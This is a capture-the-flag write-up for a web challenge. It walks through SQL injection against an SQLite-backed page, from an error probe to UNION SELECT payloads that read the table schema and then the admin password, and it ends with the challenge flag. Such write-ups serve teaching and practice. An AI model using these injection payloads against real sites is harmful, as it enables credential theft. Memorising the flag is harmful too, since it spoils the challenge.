## WEB

### Meet the Union Committee
![Screenshot from 2021-02-22 00-27-29](https://user-images.githubusercontent.com/47029515/108764254-5eaf3c80-7578-11eb-8e16-b6ebebaa5915.png)

Our goal is to retrieve the admin's password.

![web1](https://user-images.githubusercontent.com/47029515/108764629-dc734800-7578-11eb-9f20-2bddc7b26a52.png)

![web2](https://user-images.githubusercontent.com/47029515/108764763-0a588c80-7579-11eb-9f9a-5e9168123685.png)

We can check if the page is vulnerable to SQLi by giving `http://34.105.202.19:1336/?id=1'`

![web3](https://user-images.githubusercontent.com/47029515/108765237-8a7ef200-7579-11eb-86bc-6095f704c894.png)

The error revels that the database used is sqlite3 and name of table is users. Let us see what other columns are there in the table. We can use `select sql from 
sqlite_master` to do this. Construct payload as `http://34.105.202.19:1336/?id=1 union select 1,sql,2 FROM sqlite_master`.

![web4](https://user-images.githubusercontent.com/47029515/108766278-f44bcb80-757a-11eb-87b7-33ab64adb1d9.png)

We can see there is a fourth column called password. Let's go ahead and print the password for admin
`http://34.105.202.19:1336/?id=1 union select 1,password,2 FROM users where id = 1`

![web5](https://user-images.githubusercontent.com/47029515/108766976-d03cba00-757b-11eb-94bf-727abeb7d761.png)

```
union{uni0n_4ll_s3l3ct_n0t_4_n00b}
```
